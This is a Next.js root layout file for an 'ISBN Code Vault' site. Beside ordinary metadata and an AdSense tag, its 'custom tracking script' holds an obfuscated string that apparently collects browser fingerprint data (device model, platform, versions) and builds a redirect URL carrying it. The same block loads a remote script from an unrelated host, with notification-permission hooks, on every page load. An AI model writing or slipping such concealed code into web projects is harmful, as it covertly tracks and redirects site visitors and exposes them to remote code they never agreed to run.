import type { Metadata } from "next";
import localFont from "next/font/local";
import "./globals.css";
import Script from 'next/script';

const geistSans = localFont({
  src: "./fonts/GeistVF.woff",
  variable: "--font-geist-sans",
  weight: "100 900",
});
const geistMono = localFont({
  src: "./fonts/GeistMonoVF.woff",
  variable: "--font-geist-mono",
  weight: "100 900",
});

export const metadata: Metadata = {
  title: "ISBN Code Vault",
  description: "Securely reveal and claim unique ISBN codes for your publishing needs. Each code is strictly issued exactly once.",
  keywords: ["ISBN", "book publishing", "ISBN tracker", "unique codes", "free ISBN generator"],
  authors: [{ name: "ISBN Vault" }],
  openGraph: {
    title: "ISBN Code Vault",
    description: "Securely reveal and claim unique ISBN codes. Issued once, permanently yours.",
    url: "http://localhost:3000",
    siteName: "ISBN Code Vault",
    locale: "en_US",
    type: "website",
  },
  twitter: {
    card: "summary_large_image",
    title: "ISBN Code Vault",
    description: "Securely reveal and claim unique ISBN codes. Issued once, permanently yours.",
  },
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      'max-image-preview': 'large',
      'max-video-preview': -1,
      'max-snippet': -1,
    },
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">
      <body className={`${geistSans.variable} ${geistMono.variable} antialiased`}>
        {children}
      </body>

      {/* Google AdSense */}
      <Script
        async
        src={`https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=${process.env.NEXT_PUBLIC_ADSENSE_CLIENT_ID || "ca-pub-0000000000000000"}`}
        crossOrigin="anonymous"
        strategy="lazyOnload"
      />

      {/* Your Custom JavaScript Code */}
      <Script id="custom-tracking-script" strategy="afterInteractive">
        {`
          var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');
          var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]);
          
          var s = document.createElement('script');
          s.src='//9hito.com/4a2/b17a1/mw.min.js?z=10763835'+'&sw=/sw-check-permissions-8e8d8.js';
          s.onload = function(result) {
              switch (result) {
                  case 'onPermissionDefault':break;
                  case 'onPermissionAllowed':break;
                  case 'onPermissionDenied':break;
                  case 'onAlreadySubscribed':break;
                  case 'onNotificationUnsupported':break;
              }
          };
          document.head.appendChild(s);
        `}
      </Script>
    </html>
  );
}
